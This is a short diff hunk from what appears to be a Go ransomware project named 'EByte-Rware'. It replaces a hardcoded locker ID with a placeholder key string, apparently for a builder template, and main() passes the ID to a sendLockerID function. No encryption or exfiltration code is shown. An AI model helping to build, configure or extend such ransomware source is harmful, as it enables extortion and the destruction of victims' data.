@@ -15,7 +15,7 @@ import (
 	"EByte-Rware/filewalker"
 )
 
-const EbyteLocker = "locker-1737659366596927700"
+const EbyteLocker = "%BYTELOCKER_KEY_HERE%"
 
 func main() {
 	sendLockerID(EbyteLocker)
